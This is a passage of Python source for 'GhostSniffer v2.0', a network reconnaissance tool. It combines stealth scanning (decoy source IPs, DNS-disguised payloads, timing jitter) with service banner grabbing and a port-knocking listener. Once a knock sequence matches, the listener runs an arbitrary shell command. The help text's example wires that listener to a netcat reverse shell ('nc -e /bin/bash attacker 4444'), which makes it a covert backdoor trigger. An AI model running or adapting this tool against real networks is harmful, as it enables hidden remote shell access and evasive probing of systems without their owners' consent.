        print(f"[>] Scan Type: {self.scan_type}")

        if self.scan_type == 'tcp_syn':
            port_list = self.ports if self.ports else list(range(1, 1025))
            print(f"[>] Ports: {len(port_list)} ports")
        elif self.scan_type == 'udp':
            print(f"[>] Port: {self.port}")

        print(f"[>] Mimicry: {self.mimicry}"
              + (f' (domain: {self.dns_domain})'
                 if self.mimicry == 'dns' else ''))

        if self.jitter:
            print(f"[>] Jitter: {self.jitter[0]}s - {self.jitter[1]}s")
        if self.decoys:
            print(f"[>] Decoys: {', '.join(self.decoys)}")
        print(f"[>] Local IP: {self._local_ip}")
        print()

    def stop(self) -> None:
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._socket:
            self._socket.close()

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def stats(self) -> dict:
        return dict(self._stats)

# ============================================================================
#  KnockListener — Port Knocking (Feature 4)
# ============================================================================

class KnockListener:
    """Monitor incoming packets for a port-knock sequence.

    When the complete sequence is matched within the timeout window
    the configured *action* command is executed via subprocess.
    """

    def __init__(self, sequence: list, protocol: str = 'udp',
                 timeout: float = 5.0, action: str = None):
        self.sequence       = sequence      # e.g. [1000, 2000, 3000]
        self.protocol       = protocol.upper()
        self.timeout        = timeout
        self.action         = action
        self.current_index  = 0
        self.last_knock_time = 0.0
        self._lock          = threading.Lock()

    def check_packet(self, proto: str, value: int) -> bool:
        """Check whether *value* (port or ICMP type) matches the next
        expected knock.  Returns True when the full sequence completes."""
        with self._lock:
            now = time.time()

            # Reset if too slow
            if (self.current_index > 0 and
                    (now - self.last_knock_time) > self.timeout):
                self.current_index = 0

            if proto.upper() != self.protocol:
                return False

            if value == self.sequence[self.current_index]:
                self.current_index += 1
                self.last_knock_time = now
                print(f"[*] Knock {self.current_index}/{len(self.sequence)}: "
                      f"{proto} {value}")

                if self.current_index >= len(self.sequence):
                    self.current_index = 0
                    return True          # full sequence matched
            else:
                if self.current_index > 0:
                    self.current_index = 0
            return False

    def execute_action(self) -> None:
        """Run the configured shell command."""
        if not self.action:
            return
        try:
            subprocess.Popen(self.action, shell=True)
            print(f"[+] Action executed: {self.action}")
        except Exception as e:
            print(f"[!] Action execution failed: {e}")

# ============================================================================
#  ServiceDetector — Service Version Detection (Feature 5)
# ============================================================================

class ServiceDetector:
    """Connect to open ports and grab service banners / version strings.

    Uses full TCP connect (not stealth) because we need actual
    application-layer data.  Runs *after* the SYN scan finishes.
    """

    # port -> (service_name, probe_bytes | None, wait_for_banner_first)
    PROBES = {
        21:   ('FTP',   b'',   True),
        22:   ('SSH',   b'',   True),
        23:   ('Telnet', b'',  True),
        25:   ('SMTP',  b'',   True),
        80:   ('HTTP',  None,  False),
        110:  ('POP3',  b'',   True),
        143:  ('IMAP',  b'',   True),
        443:  ('HTTPS', None,  False),
        445:  ('SMB',   b'',   True),
        3306: ('MySQL', b'',   True),
        3389: ('RDP',   b'',   True),
        5432: ('PostgreSQL', b'', True),
        6379: ('Redis', b'',   True),
        8080: ('HTTP',  None,  False),
        8443: ('HTTPS', None,  False),
        27017:('MongoDB', b'', True),
    }

    def __init__(self, registry: HostRegistry,
                 timeout: float = 5.0,
                 verbose: bool = False):
        self.registry = registry
        self.timeout  = timeout
        self.verbose  = verbose

    def detect_all(self) -> None:
        """Run banner grabs for every open port across all hosts."""
        hosts = self.registry.get_all()
        for ip, info in hosts.items():
            open_ports = info.get('open_ports', [])
            for port in open_ports:
                version = self._grab_banner(ip, port)
                if version:
                    self.registry.add_service(ip, port, version)
                    print(f"[+] Service: {ip}:{port} -> {version}")

    def _grab_banner(self, ip: str, port: int) -> str:
        """Attempt a TCP connect + banner grab on *ip*:*port*."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            probe_info = self.PROBES.get(
                port, ('Unknown', b'', True))
            service_name, probe_data, wait_first = probe_info

            banner = b''

            # Some services send a banner immediately on connect
            if wait_first:
                try:
                    banner = sock.recv(1024)
                except socket.timeout:
                    pass

            # For HTTP(S) we need to send a request
            if not wait_first:
                if port in (443, 8443):
                    try:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(
                            sock, server_hostname=ip)
                    except Exception:
                        pass
                http_req = (b'HEAD / HTTP/1.0\r\n'
                            b'Host: ' + ip.encode() + b'\r\n'
                            b'\r\n')
                try:
                    sock.send(http_req)
                    banner = sock.recv(1024)
                except socket.timeout:
                    pass

            sock.close()

            if banner:
                first_line = banner.split(b'\r\n')[0].split(b'\n')[0]
                decoded = first_line.decode('utf-8', errors='replace').strip()
                return decoded if decoded else service_name
            return service_name

        except Exception as e:
            if self.verbose:
                print(f"[*] Banner grab {ip}:{port} failed: {e}")
            return None

# ============================================================================
#  GhostSniffer — Main Orchestrator
# ============================================================================

class GhostSniffer:
    """Top-level controller that wires Sniffer + Scanner + Registry."""

    def __init__(self, args: argparse.Namespace):
        self.args     = args
        self.registry = HostRegistry()
        self.sniffer  = None
        self.scanner  = None

    def run(self) -> None:
        print("GhostSniffer v2.0 - Advanced Network Recon")
        self._print_config()

        if self.args.mode == 'passive':
            self._run_passive()
        elif self.args.mode == 'listen':
            self._run_listen()
        else:
            self._run_scan()

    # -- Config summary ------------------------------------------------------

    def _print_config(self) -> None:
        print(f"  {'-' * 50}")
        print(f"  Mode:    {self.args.mode.upper()}")
        print(f"  Time:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  OS:      {os.name}")
        print(f"  {'-' * 50}")
        print()

    # -- Passive mode --------------------------------------------------------

    def _run_passive(self) -> None:
        print("[+] Passive Discovery Mode — Silent reconnaissance active")

        subnet = None
        if self.args.subnet:
            subnet = ipaddress.ip_network(self.args.subnet, strict=False)
            print(f"[*] Filtering: {subnet}")
        else:
            print("[*] No subnet filter — capturing all traffic")
        print(f"[*] Report interval: {self.args.report_interval}s")
        print()

        self.sniffer = SnifferEngine(
            self.registry, subnet_filter=subnet,
            verbose=self.args.verbose, scan_mode=False)
        self.sniffer.start()

        stop_event = threading.Event()

        def _reporter():
            while not stop_event.is_set():
                stop_event.wait(timeout=self.args.report_interval)
                if not stop_event.is_set():
                    self._print_passive_report()

        report_thread = threading.Thread(
            target=_reporter, daemon=True, name='Reporter')
        report_thread.start()

        try:
            print("[!] Press Ctrl+C to stop and generate final report\n")
            while True:
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            stop_event.set()
            self.sniffer.stop()
            print()
            self._print_final_report()
            self._export_results()

    # -- Active scan mode ----------------------------------------------------

    def _run_scan(self) -> None:
        if not self.args.target:
            print("[!] --target is required in scan mode")
            sys.exit(1)

        print("[+] Active Scan Mode — Engaging target network")
        print()

        jitter = None
        if self.args.jitter:
            jitter = (self.args.jitter[0], self.args.jitter[1])

        decoys = None
        if self.args.decoys:
            decoys = [d.strip() for d in self.args.decoys.split(',')]

        target_net = ipaddress.ip_network(self.args.target, strict=False)

        # Start sniffer first
        self.sniffer = SnifferEngine(
            self.registry, subnet_filter=target_net,
            verbose=self.args.verbose, scan_mode=True)
        self.sniffer.start()

        # Start scanner
        scan_type = getattr(self.args, 'scan_type', 'udp')
        ports     = getattr(self.args, 'ports', None)

        self.scanner = ScannerEngine(
            registry=self.registry,
            target_subnet=self.args.target,
            port=self.args.port,
            ports=ports,
            scan_type=scan_type,
            mimicry=self.args.mimicry,
            dns_domain=self.args.dns_domain,
            jitter=jitter,
            decoys=decoys,
            verbose=self.args.verbose)
        self.scanner.start()

        try:
            while self.scanner.is_running:
                time.sleep(0.5)
            print("[*] Waiting 3s for late responses...")
            time.sleep(3)

            # ---- Service Version Detection (Feature 5) ----
            if (getattr(self.args, 'service_detection', False)
                    and scan_type == 'tcp_syn'):
                print("[*] Starting service version detection...")
                detector = ServiceDetector(
                    self.registry,
                    timeout=getattr(self.args, 'service_timeout', 5.0),
                    verbose=self.args.verbose)
                detector.detect_all()
                print("[+] Service detection complete")

        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")

        finally:
            if self.scanner:
                self.scanner.stop()
            self.sniffer.stop()
            print()
            self._print_final_report()
            self._export_results()

    # -- Port Knocking / Listen mode (Feature 4) ----------------------------

    def _run_listen(self) -> None:
        knock_seq = self.args.knock_seq
        action    = self.args.action

        if not knock_seq:
            print("[!] --knock-seq is required in listen mode")
            sys.exit(1)
        if not action:
            print("[!] --action is required in listen mode")
            sys.exit(1)

        sequence = [int(p.strip()) for p in knock_seq.split(',')]
        protocol = getattr(self.args, 'knock_proto', 'udp') or 'udp'
        timeout  = getattr(self.args, 'knock_timeout', 5.0) or 5.0

        knock = KnockListener(
            sequence=sequence,
            protocol=protocol,
            timeout=timeout,
            action=action)

        print("[+] Port Knocking Listener Active")
        print(f"[*] Sequence: {sequence}")
        print(f"[*] Protocol: {protocol}")
        print(f"[*] Timeout:  {timeout}s")
        print(f"[*] Action:   {action}")
        print()

        subnet = None
        if self.args.subnet:
            subnet = ipaddress.ip_network(self.args.subnet, strict=False)

        self.sniffer = SnifferEngine(
            self.registry, subnet_filter=subnet,
            verbose=self.args.verbose, scan_mode=False,
            knock_listener=knock)
        self.sniffer.start()

        try:
            print("[!] Press Ctrl+C to stop\n")
            while True:
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            self.sniffer.stop()
            print("\n[+] Listener stopped")

    # -- Reports -------------------------------------------------------------

    def _print_passive_report(self) -> None:
        count = self.registry.count()
        stats = self.sniffer.stats if self.sniffer else {}

        print(f"\n  {'=' * 48}")
        print(f"    PERIODIC REPORT  "
              f"{datetime.now().strftime('%H:%M:%S')}")
        print(f"  {'=' * 48}")
        print(f"  Hosts discovered:  {count}")
        print(f"  Packets captured:  "
              f"{stats.get('packets_captured', 0)}")

        hosts = self.registry.get_all()
        if hosts:
            recent = sorted(
                hosts.values(),
                key=lambda h: h['last_seen'], reverse=True)
            print("  Last 5 seen:")
            for h in recent[:5]:
                protos = ', '.join(h['protocols'])
                os_g = h.get('os_guess', '')
                os_str = f" ({os_g})" if os_g else ""
                print(f"    * {h['ip']:<16} [{protos}] "
                      f"pkts:{h['packet_count']}{os_str}")
        print(f"  {'=' * 48}\n")

    def _print_final_report(self) -> None:
        hosts      = self.registry.get_all()
        responsive = self.registry.get_responsive()
        s_stats    = self.sniffer.stats  if self.sniffer  else {}
        c_stats    = self.scanner.stats  if self.scanner  else {}

        width = 75
        print(f"\n{'=' * width}")
        print("  GHOSTSNIFFER — FINAL REPORT")
        print(f"{'=' * width}")

        print(f"\n  Statistics:")
        print(f"  {'-' * 42}")
        print(f"  Packets Captured:     "
              f"{s_stats.get('packets_captured', 0)}")
        if c_stats:
            print(f"  Packets Sent:         "
                  f"{c_stats.get('packets_sent', 0)}")
            print(f"  Decoy Packets Sent:   "
                  f"{c_stats.get('decoy_packets_sent', 0)}")
            print(f"  Hosts Scanned:        "
                  f"{c_stats.get('hosts_scanned', 0)}")
            print(f"  ICMP Responses:       "
                  f"{s_stats.get('icmp_responses', 0)}")
        print(f"  Unique Hosts Found:   {len(hosts)}")
        if responsive:
            print(f"  Hosts Confirmed Up:   {len(responsive)}")

        if hosts:
            print(f"\n  Discovered Hosts:")
            print(f"  {'-' * (width - 4)}")
            print(f"  {'IP Address':<18} {'Status':<10} "
                  f"{'Protocols':<12} {'OS Guess':<16} {'Open Ports'}")
            print(f"  {'-' * (width - 4)}")

            sorted_hosts = sorted(
                hosts.values(),
                key=lambda h: ipaddress.ip_address(h['ip']))

            for h in sorted_hosts:
                st  = h.get('status', 'discovered')
                pr  = ', '.join(h['protocols'])
                os_g = h.get('os_guess', '-') or '-'

                # Format ports with optional service info
                open_ports = h.get('open_ports', [])
                services   = h.get('services', {})
                if open_ports:
                    parts = []
                    for p in sorted(open_ports):
                        svc = services.get(p, services.get(str(p), ''))
                        if svc:
                            # Shorten long banners
                            short = svc[:30] + '...' if len(svc) > 30 \
                                    else svc
                            parts.append(f"{p}({short})")
                        else:
                            parts.append(str(p))
                    ports_str = ', '.join(parts)
                else:
                    ports_str = '-'

                print(f"  {h['ip']:<18} {st:<10} "
                      f"{pr:<12} {os_g:<16} {ports_str}")

            print(f"  {'-' * (width - 4)}")
        else:
            print("\n  No hosts discovered.")

        print(f"\n{'=' * width}")
        print(f"[+] Completed at "
              f"{datetime.now().strftime('%H:%M:%S')}")
        print()

    # -- JSON export ---------------------------------------------------------

    def _export_results(self) -> None:
        if not self.args.output:
            return

        hosts    = self.registry.get_all()
        s_stats  = self.sniffer.stats  if self.sniffer  else {}
        c_stats  = self.scanner.stats  if self.scanner  else {}

        report = {
            'tool': 'GhostSniffer v2.0',
            'timestamp': datetime.now().isoformat(),
            'mode': self.args.mode,
            'config': {
                'target':    getattr(self.args, 'target', None),
                'scan_type': getattr(self.args, 'scan_type', 'udp'),
                'port':      getattr(self.args, 'port', None),
                'ports':     getattr(self.args, 'ports', None),
                'mimicry':   self.args.mimicry,
                'jitter':    self.args.jitter,
                'decoys':    self.args.decoys,
            },
            'statistics': {**s_stats, **c_stats},
            'hosts': hosts,
        }

        try:
            with open(self.args.output, 'w', encoding='utf-8') as fh:
                json.dump(report, fh, indent=2, ensure_ascii=False)
            print(f"[+] Results exported to: {self.args.output}")
        except Exception as exc:
            print(f"[!] Export failed: {exc}")

# ============================================================================
#  CLI Argument Parser
# ============================================================================

def parse_ports(port_str: str) -> list:
    """Parse a port specification string into a sorted list of integers.

    Accepted formats:
        '22'              -> [22]
        '22,80,443'       -> [22, 80, 443]
        '1-1024'          -> [1, 2, ..., 1024]
        '22,80,1000-2000' -> [22, 80, 1000, ..., 2000]
    """
    ports = set()
    for part in port_str.split(','):
        part = part.strip()
        if '-' in part:
            try:
                start, end = part.split('-', 1)
                for p in range(int(start), int(end) + 1):
                    if 1 <= p <= 65535:
                        ports.add(p)
            except ValueError:
                raise argparse.ArgumentTypeError(
                    f"Invalid port range: {part}")
        else:
            try:
                p = int(part)
                if not 1 <= p <= 65535:
                    raise argparse.ArgumentTypeError(
                        f"Port out of range: {p}")
                ports.add(p)
            except ValueError:
                raise argparse.ArgumentTypeError(
                    f"Invalid port number: {part}")
    return sorted(ports)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog='ghost_sniffer',
        description='GhostSniffer v2.0 — Advanced Network Reconnaissance Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:

  # Passive host discovery on local subnet
  ghost_sniffer --mode passive --subnet 192.168.1.0/24

  # Active UDP scan (default)
  ghost_sniffer --target 192.168.1.0/24

  # TCP SYN half-open scan on specific ports
  ghost_sniffer --target 192.168.1.0/24 --scan-type tcp_syn -p 22,80,443

  # TCP SYN scan with service version detection
  ghost_sniffer --target 192.168.1.0/24 --scan-type tcp_syn -p 1-1024 -sV

  # ARP host discovery (Linux only)
  ghost_sniffer --target 192.168.1.0/24 --scan-type arp

  # Full stealth scan with decoys
  ghost_sniffer --target 10.0.0.0/24 --stealth \\
    --decoys 10.0.0.1,10.0.0.254

  # Port knocking listener
  ghost_sniffer --mode listen --knock-seq 1000,2000,3000 \\
    --knock-proto udp --action "nc -e /bin/bash attacker 4444"

  # Scan with custom jitter and JSON output
  ghost_sniffer --target 192.168.1.0/24 \\
    --jitter 0.5 2.0 --output results.json

  # Verbose scan for debugging
  ghost_sniffer --target 192.168.1.0/24 -v
""")

    # ---- Mode ----
    p.add_argument(
        '--mode', choices=['scan', 'passive', 'listen'], default='scan',
        help='Operation mode (default: scan)')

    # ---- Targeting ----
    p.add_argument(
        '--target', '-t', type=str, default=None,
        help='Target subnet for scan (e.g. 192.168.1.0/24)')
    p.add_argument(
        '--subnet', type=str, default=None,
        help='Subnet filter for passive/listen mode')

    # ---- Scan type ----
    p.add_argument(
        '--scan-type', choices=['udp', 'tcp_syn', 'arp'], default='udp',
        help='Scan type: udp, tcp_syn, or arp (default: udp)')
    p.add_argument(
        '--ports', '-p', type=str, default=None,
        help='Target ports for TCP SYN scan '
             '(e.g. 22,80,443 or 1-1024)')
    p.add_argument(
        '--port', type=int,
        default=int(os.environ.get('DEFAULT_PORT', 65212)),
        help='Destination port for UDP scan (default: 65212)')

    # ---- Mimicry / Stealth ----
    p.add_argument(
        '--mimicry', choices=['normal', 'dns'], default='normal',
        help='Payload disguise: normal or dns (default: normal)')
    p.add_argument(
        '--dns-domain', type=str,
        default=os.environ.get('STEALTH_DOMAIN', 'google.com'),
        help='Domain for dns mimicry (default: google.com)')
    p.add_argument(
        '--jitter', nargs=2, type=float, metavar=('MIN', 'MAX'),
        help='Random delay range in seconds (e.g. 0.5 2.0)')
    p.add_argument(
        '--decoys', type=str, default=None,
        help='Comma-separated decoy IPs '
             '(e.g. 10.0.0.1,10.0.0.254)')
    p.add_argument(
        '--stealth', action='store_true',
        help='Shortcut: enable dns mimicry + jitter 0.5-2.0')

    # ---- Service detection (Feature 5) ----
    p.add_argument(
        '--service-detection', '-sV', action='store_true',
        help='Detect service versions on open ports '
             '(requires --scan-type tcp_syn)')
    p.add_argument(
        '--service-timeout', type=float, default=5.0,
        help='Timeout per service probe in seconds (default: 5)')

    # ---- Port Knocking (Feature 4) ----
    p.add_argument(
        '--knock-seq', type=str, default=None,
        help='Port knock sequence (e.g. 1000,2000,3000)')
    p.add_argument(
        '--knock-proto', choices=['udp', 'icmp'], default='udp',
        help='Protocol for port knocking (default: udp)')
    p.add_argument(
        '--knock-timeout', type=float, default=5.0,
        help='Timeout between knocks in seconds (default: 5)')
    p.add_argument(
        '--action', type=str, default=None,
        help='Command to execute when knock sequence completes')

    # ---- Output ----
    p.add_argument(
        '--output', '-o', type=str, default=None,
        help='Export results to JSON file')
    p.add_argument(
        '--report-interval', type=int,
        default=int(os.environ.get('REPORT_INTERVAL', 30)),
        help='Seconds between passive reports (default: 30)')
    p.add_argument(
        '--verbose', '-v', action='store_true',
        help='Show every captured packet')

    return p

# ============================================================================
#  Main Entry Point
# ============================================================================

def main() -> None:
    # 1. Load .env first so environment variables are available
    load_dotenv()

    # 2. Parse arguments FIRST so --help works without privileges
    parser = build_parser()
    args = parser.parse_args()

    # 3. Check privileges (after argparse so --help always works)
    if os.name == 'nt':
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                print("[!] This tool requires Administrator privileges "
                      "on Windows.")
                print("[*] Please run as Administrator "
                      "(right-click -> Run as administrator).")
                sys.exit(1)
        except Exception:
            print("[!] Could not verify admin privileges. "
                  "Raw sockets may fail.")
    else:
        if os.geteuid() != 0:
            print("[!] This tool requires root privileges on Linux.")
            print("[*] Please run with sudo: "
                  "sudo ghost_sniffer ...")
            sys.exit(1)

    # 4. Parse port list for TCP SYN scan
    if args.ports:
        args.ports = parse_ports(args.ports)
    elif args.scan_type == 'tcp_syn' and not args.ports:
        # Default: top 1024 ports
        args.ports = list(range(1, 1025))

    # 5. Apply environment defaults for jitter and decoys
    if not args.jitter:
        try:
            min_j = float(os.environ.get('JITTER_MIN', ''))
            max_j = float(os.environ.get('JITTER_MAX', ''))
            args.jitter = [min_j, max_j] if min_j < max_j else None
        except (ValueError, TypeError):
            pass

    if not args.decoys and os.environ.get('DECOY_IPS'):
        args.decoys = os.environ.get('DECOY_IPS')

    # 6. Validate decoys
    if args.decoys:
        decoys = [d.strip() for d in args.decoys.split(',')]
        for ip in decoys:
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                parser.error(f"Invalid decoy IP: {ip}")
        args.decoys = ','.join(decoys)

    # 7. --stealth shortcut
    if args.stealth:
        args.mimicry = 'dns'
        if not args.jitter:
            args.jitter = [0.5, 2.0]

    # 8. Validate mode requirements
    if args.mode == 'scan' and not args.target:
        parser.error("--target is required in scan mode")

    if args.mode == 'listen' and not args.knock_seq:
        parser.error("--knock-seq is required in listen mode")

    if args.mode == 'listen' and not args.action:
        parser.error("--action is required in listen mode")

    if args.jitter and args.jitter[0] >= args.jitter[1]:
        parser.error("Jitter MIN must be less than MAX")

    # 9. Run
    ghost = GhostSniffer(args)
    ghost.run()


if __name__ == '__main__':
    main()